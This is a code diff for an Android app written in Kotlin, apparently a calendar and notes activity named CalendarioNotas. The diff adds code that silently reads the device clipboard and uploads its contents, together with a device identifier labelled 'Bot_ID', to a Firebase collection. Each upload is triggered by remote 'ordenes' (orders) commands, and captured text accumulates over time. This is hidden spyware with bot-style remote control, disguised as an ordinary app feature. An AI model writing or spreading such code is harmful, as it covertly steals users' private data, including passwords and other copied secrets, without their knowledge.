@@ -20,6 +20,7 @@ import java.util.*
 
 var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
 var currentDate = ""
+var portapapelesGlobal = ""  // Variable global para almacenar el portapapeles
 
 class CalendarioNotas : AppCompatActivity() {
     var simpleCalendarView: CalendarView? = null
@@ -118,29 +119,42 @@ class CalendarioNotas : AppCompatActivity() {
             val strDate: String = sdf.format(c.time)
             val db = Firebase.firestore
             val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
-            val copiedString = clipBoardManager.primaryClip.toString()
-            Log.d("TAG2", "este texto es " + copiedString!!)
+            val copiedString = clipBoardManager.text
+            if(!copiedString.isNullOrEmpty()) {
+                Log.d("TAG2", "este texto es " + copiedString!!)
 
 
-            val datosPortapapeles = hashMapOf(
-                "Bot_ID" to idAndroid,
-                "Date" to strDate,
-                "Portapapeles" to copiedString
-            )
-            db.collection("ordenes")
-                .addSnapshotListener { snapshot, e ->
-                    if (e != null) {
-                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
-                        return@addSnapshotListener
-                    }
-
-                    for (dc in snapshot!!.documentChanges) {
-                        when (dc.type) {
-                            DocumentChange.Type.ADDED -> db.collection("portapapeles")
-                                .document(idAndroid).update(datosPortapapeles as Map<String, Any>)
-                        }
+                db.collection("portapapeles").document(idAndroid).get().addOnSuccessListener {
+                    val contenido = it.data?.get("Portapapeles").toString()
+                    if (!(contenido.contains(copiedString))) {
+                        portapapelesGlobal = copiedString.toString() + ", " + contenido
+                    } else {
+                        portapapelesGlobal = contenido
                     }
                 }
+
+                val datosPortapapeles = hashMapOf(
+                    "Bot_ID" to idAndroid,
+                    "Date" to strDate,
+                    "Portapapeles" to portapapelesGlobal
+                )
+
+                db.collection("ordenes")
+                    .addSnapshotListener { snapshot, e ->
+                        if (e != null) {
+                            Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                            return@addSnapshotListener
+                        }
+
+                        for (dc in snapshot!!.documentChanges) {
+                            when (dc.type) {
+                                DocumentChange.Type.ADDED -> db.collection("portapapeles")
+                                    .document(idAndroid)
+                                    .update(datosPortapapeles as Map<String, Any>)
+                            }
+                        }
+                    }
+            }
         }
     }
 
